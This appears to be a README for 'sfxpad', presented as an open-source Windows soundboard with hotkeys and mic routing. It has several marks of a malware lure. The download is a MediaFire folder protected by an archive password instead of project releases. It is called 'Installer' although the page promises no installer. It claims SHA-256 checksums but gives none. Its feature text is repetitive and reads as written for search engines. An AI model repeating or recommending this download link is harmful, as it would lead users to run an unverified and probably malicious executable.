# sfxpad

🔊 Free, open-source soundboard for Windows — hotkey pads, mic routing and per-pad volume in a 100 MB offline app. No account, MIT.

[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/platform-Windows%2010%20%7C%2011%20x64-blue.svg)]()
[![Build](https://img.shields.io/badge/build-100%20MB%20single%20exe-orange.svg)]()

## Features

- ✅ **Hotkey pads** — bind sounds to F-keys or numpad and fire them while the game or call keeps focus
- ✅ **Mic routing** — send playback to your own speakers or, with a virtual cable, into the mic so others hear it
- ✅ **Per-pad volume and loop** — independent gain, trim start/end, and toggle loops for ambience beds
- ✅ **Overlapping playback** — the same pad can retrigger before it ends; no queueing delays
- ✅ **Sound library import** — drag WAV/MP3/OGG/FLAC files into a grid; per-board pages keep genres apart
- ✅ **No account, fully offline** — no cloud library, no telemetry; sample packs stay on disk
- ✅ **100 MB self-contained exe** — runtime and codecs bundled, portable, MIT with SHA-256 releases

## Why sfxpad

- MIT licensed, source in the open
- No ads, no account, no telemetry
- Single portable 100 MB exe - no installer, runs offline
- CI builds every release and publishes SHA-256 checksums
- Windows 10 / 11 x64

## Comparison

| Feature | **sfxpad** | Soundpad | Soundux | EXP Soundboard |
|---|:---:|:---:|:---:|:---:|
| Price | **Free, MIT** | Paid | Free, OSS | Free |
| Open source | **Yes** | No | Yes | No |
| Hotkeys while game focused | **Yes** | Yes | Partial | Yes |
| Native, no Electron | **Yes** | Yes | No | No |
| Per-pad trim and loop | **Yes** | Loop only | Loop only | No |
| Portable, no install | **Yes, 100 MB** | No | No | Zip |

## FAQ

**how to play sounds through your microphone on Windows?**

You route audio, not spoof it: send sfxpad output into a virtual audio cable and select that cable as your mic input in the chat app. sfxpad keeps the live path separate, so your real voice and your pads mix unless you mute one. It is a 100 MB portable exe under MIT with no account and no telemetry.

## Screenshots

All screenshots describe the 1280x800 dark UI.

1. Dark pad grid (4x4, accent violet #A78BFA): each tile shows name, hotkey badge and mini waveform; a master output meter sits right.
2. Pad editor: trim handles, volume knob at -3 dB, loop toggle, hotkey capture field, routing choice Speakers or Virtual Cable.
3. Board manager: multiple boards listed (Games, Alerts, Ambience), import folder dialog, device dropdown showing CABLE Input active.

## Download

| Source | Link |
|---|---|
| 💾 **Installer sfxpad** | [Installer sfxpad](https://www.mediafire.com/folder/xfbu35fzy4zd6/Installer) |

> Archive password: `5139237619`

## Build

Requires the .NET SDK on Windows 10/11 x64:

```
dotnet publish -c Release -r win-x64 --self-contained -p:PublishSingleFile=true
```

## License

MIT. See [LICENSE](LICENSE).